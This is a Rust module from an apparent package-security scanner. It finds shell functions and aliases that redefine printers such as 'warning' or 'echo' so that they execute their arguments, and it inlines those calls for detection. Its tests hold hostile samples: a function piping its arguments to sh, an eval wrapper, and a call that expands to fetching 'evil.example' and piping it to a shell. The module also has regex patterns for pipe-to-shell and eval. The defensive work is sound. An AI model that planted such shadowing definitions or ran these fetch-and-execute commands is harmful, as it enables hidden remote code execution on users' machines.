//! Redefined message printers.
//!
//! `echo`, `printf`, `msg`, `note`, `warning` ... are treated as inert text by
//! [`super::informational_lines`]: a line that only prints cannot run anything.
//! That only holds while those names mean what they say. Shell functions and
//! aliases shadow builtins and commands, so a package that defines
//! `warning() { "$@" | sh; }` turns every `warning ...` line into code.
//!
//! This module finds such definitions anywhere in a package (PKGBUILD, install
//! scriptlets, sidecars), decides whether a definition is a harmless wrapper
//! around a real print or something that runs its arguments, and inlines calls
//! to the dangerous ones so the ordinary detectors see the command that will
//! really run. Static only: nothing is executed or sourced.

use crate::textutil::{
    logical_lines, normalize_shell_quoting, split_statements, split_words, SHELLS,
};
use lazy_static::lazy_static;
use regex::Regex;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

/// Command names that `informational_lines` treats as printing text.
pub(crate) const PRINTERS: &[&str] = &[
    "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
];

/// Printers plus `cat`, which the heredoc rule also trusts.
const CHECKED: &str = "echo|printf|print|note|msg|msg2|warning|plain|error|cat";

lazy_static! {
    /// `name() {`, `name () (`, optionally prefixed by `function`.
    static ref FN_PARENS: Regex = Regex::new(&format!(
        r"(?m)(?:^|[;&|(){{}}\s])(?:function\s+)?({CHECKED})\s*\(\s*\)\s*([{{(])"
    ))
    .unwrap();
    /// `function name {` (no parentheses).
    static ref FN_KEYWORD: Regex = Regex::new(&format!(
        r"(?m)(?:^|[;&|(){{}}\s])function\s+({CHECKED})\s*()\{{"
    ))
    .unwrap();
    /// `alias name=value`.
    static ref ALIAS: Regex = Regex::new(&format!(
        r#"(?m)(?:^|[;&|(){{}}\s])alias\s+(?:-\w+\s+)*({CHECKED})=(?:'([^']*)'|"([^"]*)"|(\S*))"#
    ))
    .unwrap();
    static ref POSITIONAL: Regex =
        Regex::new(r#"\$(?:[@*1-9]|\{[@*1-9])"#).unwrap();
    static ref SHELL_DASH_C: Regex = Regex::new(&format!(
        r"(?i)\b{SHELLS}\s+(?:-\S+\s+)*-\w*c\b"
    ))
    .unwrap();
    static ref PIPE_TO_SHELL: Regex = Regex::new(&format!(
        r"\|\s*(?:(?:sudo|env|exec|command)\s+)*(?:\S*/)?{SHELLS}\b"
    ))
    .unwrap();
    static ref EVAL: Regex = Regex::new(r"(?:^|[\s;&|(])eval\b").unwrap();
    static ref SUBST: Regex =
        Regex::new(r#""?\$(?:\{([@*]|[0-9])\}|([@*]|[0-9]))"?"#).unwrap();
}

/// One function or alias that shadows a printer name.
#[derive(Debug, Clone)]
pub struct ShadowDef {
    /// The shadowed name (`warning`).
    pub name: String,
    /// Function body (between the braces) or alias value.
    pub body: String,
    /// Defined with `alias` rather than as a function.
    pub alias: bool,
    /// File the definition was found in.
    pub file: PathBuf,
    /// 1-based line of the definition.
    pub line: usize,
}

/// Every shadowing definition found across a package.
#[derive(Debug, Clone, Default)]
pub struct ShadowSet {
    /// All definitions, in discovery order.
    pub defs: Vec<ShadowDef>,
}

fn closing(open: char) -> char {
    if open == '(' {
        ')'
    } else {
        '}'
    }
}

/// The text between the group opened at `open_idx` and its matching closer.
/// Quote- and escape-aware; an unterminated group runs to the end of the text.
fn group_body(text: &str, open_idx: usize) -> String {
    let chars: Vec<(usize, char)> = text[open_idx..].char_indices().collect();
    let open = chars[0].1;
    let close = closing(open);
    let (mut depth, mut sq, mut dq) = (0i32, false, false);
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i].1;
        if sq {
            sq = c != '\'';
        } else if c == '\\' {
            i += 1;
        } else if dq {
            dq = c != '"';
        } else if c == '\'' {
            sq = true;
        } else if c == '"' {
            dq = true;
        } else if c == open {
            depth += 1;
        } else if c == close {
            depth -= 1;
            if depth == 0 {
                return text[open_idx + 1..open_idx + chars[i].0].to_string();
            }
        }
        i += 1;
    }
    text[open_idx + 1..].to_string()
}

fn line_of(text: &str, idx: usize) -> usize {
    text[..idx].bytes().filter(|&b| b == b'\n').count() + 1
}

impl ShadowSet {
    /// Find definitions in several files at once.
    pub fn from_texts<'a>(texts: impl IntoIterator<Item = (&'a Path, &'a str)>) -> Self {
        let mut set = ShadowSet::default();
        for (path, text) in texts {
            set.add_text(path, text);
        }
        set
    }

    /// Definitions in one text (no file context needed).
    pub fn from_text(text: &str) -> Self {
        Self::from_texts([(Path::new(""), text)])
    }

    fn add_text(&mut self, path: &Path, text: &str) {
        // Cheap precheck: no printer name, no definition.
        if !PRINTERS.iter().chain(&["cat"]).any(|n| text.contains(n)) {
            return;
        }
        for caps in FN_PARENS.captures_iter(text) {
            let (name, open) = (caps.get(1).unwrap(), caps.get(2).unwrap());
            self.defs.push(ShadowDef {
                name: name.as_str().to_string(),
                body: group_body(text, open.start()),
                alias: false,
                file: path.to_path_buf(),
                line: line_of(text, name.start()),
            });
        }
        for caps in FN_KEYWORD.captures_iter(text) {
            let name = caps.get(1).unwrap();
            let open = text[name.end()..].find('{').map(|k| name.end() + k);
            if let Some(open) = open {
                self.defs.push(ShadowDef {
                    name: name.as_str().to_string(),
                    body: group_body(text, open),
                    alias: false,
                    file: path.to_path_buf(),
                    line: line_of(text, name.start()),
                });
            }
        }
        for caps in ALIAS.captures_iter(text) {
            let name = caps.get(1).unwrap();
            let val = caps
                .get(2)
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))
                .map(|m| m.as_str())
                .unwrap_or("");
            self.defs.push(ShadowDef {
                name: name.as_str().to_string(),
                body: val.to_string(),
                alias: true,
                file: path.to_path_buf(),
                line: line_of(text, name.start()),
            });
        }
    }

    /// Names that must no longer be trusted as inert printers.
    ///
    /// A redefinition that only wraps a real print (`msg() { echo "==> $1"; }`)
    /// keeps the name inert, because nothing it can do differs from the printer
    /// it replaces. Anything else, including a body this module cannot show to
    /// be a plain print, un-trusts the name for the whole package.
    pub fn names(&self) -> HashSet<String> {
        self.defs
            .iter()
            .filter(|d| !is_benign(d))
            .map(|d| d.name.clone())
            .collect()
    }

    /// Definitions whose body runs its arguments.
    pub fn executing(&self) -> impl Iterator<Item = &ShadowDef> {
        self.defs.iter().filter(|d| executes_args(d))
    }

    /// No definitions found.
    pub fn is_empty(&self) -> bool {
        self.defs.is_empty()
    }

    /// `text` with each call to an untrusted redefined printer replaced by the
    /// definition's body (arguments substituted), so detectors see the command
    /// that really runs. Line numbers are preserved. `None` when no call was
    /// inlined.
    pub fn inline_calls(&self, text: &str) -> Option<String> {
        let names = self.names();
        if names.is_empty() {
            return None;
        }
        let total = text.lines().count();
        let mut out = vec![String::new(); total.max(1)];
        let mut changed = false;
        for (start, line) in logical_lines(text) {
            let rebuilt = self.inline_line(&line, &names);
            if rebuilt.is_some() {
                changed = true;
            }
            if let Some(slot) = out.get_mut(start.saturating_sub(1)) {
                *slot = rebuilt.unwrap_or(line);
            }
        }
        changed.then(|| out.join("\n"))
    }

    fn inline_line(&self, line: &str, names: &HashSet<String>) -> Option<String> {
        if line.trim_start().starts_with('#') {
            return None;
        }
        let mut rebuilt = String::new();
        let mut changed = false;
        for (stmt, sep) in split_statements(line) {
            match self.inline_stmt(&stmt, names) {
                Some(s) => {
                    changed = true;
                    rebuilt.push_str(&s);
                }
                None => rebuilt.push_str(&stmt),
            }
            rebuilt.push_str(&sep);
        }
        changed.then_some(rebuilt)
    }

    fn inline_stmt(&self, stmt: &str, names: &HashSet<String>) -> Option<String> {
        const KEYWORDS: &[&str] = &[
            "then", "do", "else", "if", "elif", "while", "until", "!", "{", "(",
        ];
        let words = split_words(stmt.trim_start());
        // A one-line function (`prepare() { plain curl ...; }`) puts the call after
        // its own header.
        let idx = words
            .iter()
            .position(|w| !KEYWORDS.contains(&w.as_str()) && !w.ends_with("()"))?;
        let name = normalize_shell_quoting(&words[idx]);
        if !names.contains(&name) {
            return None;
        }
        // `name () {` is the definition, not a call.
        if words.get(idx + 1).is_some_and(|w| w.starts_with('(')) {
            return None;
        }
        // Arguments run up to the first redirection or pipe.
        let rest = &words[idx + 1..];
        let cut = rest
            .iter()
            .position(|w| {
                w.starts_with(['|', '>', '<']) || w.starts_with("&>") || is_fd_redirect(w)
            })
            .unwrap_or(rest.len());
        let (args, tail) = rest.split_at(cut);
        // Prefer a definition that executes its arguments.
        let def = self
            .defs
            .iter()
            .filter(|d| d.name == name && !is_benign(d))
            .max_by_key(|d| executes_args(d))?;
        let mut s = words[..idx].join(" ");
        if !s.is_empty() {
            s.push(' ');
        }
        s.push_str(&expand(def, args));
        for w in tail {
            s.push(' ');
            s.push_str(w);
        }
        Some(s)
    }
}

fn is_fd_redirect(w: &str) -> bool {
    let digits = w.chars().take_while(char::is_ascii_digit).count();
    digits > 0 && w[digits..].starts_with(['>', '<'])
}

/// Body statements joined into one line (a call site is one line, and line
/// numbers must not move).
fn flatten_body(body: &str) -> String {
    let mut out = String::new();
    for l in body.lines() {
        let l = l.trim();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        if !out.is_empty() {
            let joiner = if out.ends_with(['|', '&', '{', '('])
                || out.ends_with("then")
                || out.ends_with("do")
            {
                " "
            } else {
                "; "
            };
            out.push_str(joiner);
        }
        out.push_str(l.trim_end_matches(';'));
    }
    out
}

fn expand(def: &ShadowDef, args: &[String]) -> String {
    if def.alias {
        let mut s = def.body.trim().to_string();
        for a in args {
            s.push(' ');
            s.push_str(a);
        }
        return s;
    }
    let body = flatten_body(&def.body);
    SUBST
        .replace_all(&body, |c: &regex::Captures| {
            let which = c
                .get(1)
                .or_else(|| c.get(2))
                .map(|m| m.as_str())
                .unwrap_or("");
            match which {
                "@" | "*" => args.join(" "),
                "0" => String::new(),
                d => d
                    .parse::<usize>()
                    .ok()
                    .and_then(|n| args.get(n - 1))
                    .cloned()
                    .unwrap_or_default(),
            }
        })
        .into_owned()
}

/// Words that may legitimately make up a print wrapper.
const BENIGN_WORDS: &[&str] = &[
    "echo", "printf", "true", ":", "return", "exit", "local", "shift", "[", "[[", "test", "fi",
    "done", "esac", "else", "then", "do", "if", "elif", "while", "for", "case", "}", "{",
];

/// Redirections that only send a message to stderr or discard it.
const SAFE_REDIRECTS: &[&str] = &[
    "1>&2",
    "2>&1",
    ">&2",
    "&>/dev/null",
    "2>/dev/null",
    ">/dev/null",
    "1>/dev/null",
    ">/dev/stderr",
    "1>/dev/stderr",
];

/// Whether the definition can do nothing a plain print could not.
fn is_benign(def: &ShadowDef) -> bool {
    if def.alias {
        let first = def.body.split_whitespace().next().unwrap_or("-");
        return matches!(first, "echo" | "printf" | "true" | ":")
            && !super::has_executable_operator(&def.body);
    }
    for raw in def.body.lines() {
        let l = raw.trim();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        for (stmt, _) in split_statements(l) {
            let mut words = split_words(stmt.trim());
            words.retain(|w| !SAFE_REDIRECTS.contains(&w.as_str()));
            if words.is_empty() {
                continue;
            }
            let joined = words.join(" ");
            if super::has_executable_operator(&joined) {
                return false;
            }
            // `a=$1` assignments are plain data.
            let first = normalize_shell_quoting(&words[0]);
            let is_assign = first.split_once('=').is_some_and(|(k, _)| {
                !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            });
            if !is_assign && !BENIGN_WORDS.contains(&first.as_str()) {
                return false;
            }
        }
    }
    true
}

/// Whether the body runs the arguments it is given.
fn executes_args(def: &ShadowDef) -> bool {
    if def.alias {
        return !is_benign(def);
    }
    let body: String = def
        .body
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n");
    if !POSITIONAL.is_match(&body) {
        return false;
    }
    if EVAL.is_match(&body) || SHELL_DASH_C.is_match(&body) || PIPE_TO_SHELL.is_match(&body) {
        return true;
    }
    // A positional parameter in command position: `"$@"`, `$1 ...`, or behind a
    // launcher (`exec "$@"`, `env "$@"`, `command "$1"`).
    const LAUNCHERS: &[&str] = &[
        "command", "exec", "env", "builtin", "nohup", "time", "sudo", "setsid", "nice", "xargs",
        "source", ".", "stdbuf", "timeout",
    ];
    for l in body.lines() {
        for (stmt, _) in split_statements(l) {
            for part in stmt.split('|') {
                let words = split_words(part.trim());
                let first = words.iter().find(|w| {
                    let n = normalize_shell_quoting(w);
                    !(LAUNCHERS.contains(&n.as_str())
                        || n.starts_with('-')
                        || n == "{"
                        || n == "then"
                        || n == "do")
                });
                if first.is_some_and(|w| POSITIONAL.is_match(w) && !w.starts_with('\'')) {
                    return true;
                }
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_function_alias_and_keyword_forms() {
        let t =
            "warning() { \"$@\" | sh; }\nfunction note {\n  eval \"$1\"\n}\nalias plain='sh -c'\n";
        let s = ShadowSet::from_text(t);
        let names = s.names();
        for n in ["warning", "note", "plain"] {
            assert!(names.contains(n), "{n}: {names:?}");
        }
        assert_eq!(s.executing().count(), 3);
    }

    #[test]
    fn benign_wrappers_stay_inert() {
        let t =
            "msg() { echo \"==> $1\" >&2; }\nerror() {\n  printf '%s\\n' \"$@\"\n  return 1\n}\n";
        let s = ShadowSet::from_text(t);
        assert!(s.names().is_empty(), "{:?}", s.names());
        assert_eq!(s.executing().count(), 0);
    }

    #[test]
    fn inlines_calls_with_arguments() {
        let s = ShadowSet::from_text("warning() { \"$@\" | sh; }\n");
        let t = "post_install() {\n  warning curl -s https://evil.example/x\n}\n";
        let inl = s.inline_calls(t).unwrap();
        assert!(inl.contains("curl -s https://evil.example/x | sh"), "{inl}");
        assert_eq!(inl.lines().count(), t.lines().count());
    }
}
